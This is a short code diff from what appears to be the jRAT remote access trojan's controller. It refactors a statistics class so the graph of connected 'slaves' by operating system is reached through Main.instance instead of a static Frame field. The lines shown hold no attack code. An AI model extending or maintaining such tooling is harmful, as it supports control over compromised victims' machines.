@@ -12,7 +12,7 @@ import java.util.List;
 
 import se.jrat.client.AbstractSlave;
 import se.jrat.client.Globals;
-import se.jrat.client.ui.frames.Frame;
+import se.jrat.client.Main;
 
 import com.redpois0n.graphs.graph.GraphEntry;
 import com.redpois0n.oslib.AbstractOperatingSystem;
@@ -97,7 +97,7 @@ public class OperatingSystemStatistics extends AbstractSettings implements Seria
 	}
 
 	public void reload() {
-		Frame.panelStats.osGraph.clear();
+		Main.instance.getPanelStats().osGraph.clear();
 
 		for (int i = 0; i < list.size(); i++) {
 			OperatingSystemStatEntry entry = list.get(i);
@@ -106,9 +106,9 @@ public class OperatingSystemStatistics extends AbstractSettings implements Seria
 				GraphEntry total = new GraphEntry(entry.getOperatingSystem().getDisplayString(), entry.getConnects(), Icons.getIconString(entry.os));
 				//GraphEntry unique = new GraphEntry(entry.getOS(), entry.getList().size());
 				total.setNumberColor(Color.gray);
-				Frame.panelStats.osGraph.add(total);
-				//Frame.panelStats.osGraph.add(unique);
-				Frame.panelStats.repaint();
+				Main.instance.getPanelStats().osGraph.add(total);
+				//Main.instance.getPanelStats().osGraph.add(unique);
+				Main.instance.getPanelStats().repaint();
 			} catch (Exception e) {
 				e.printStackTrace();
 			}
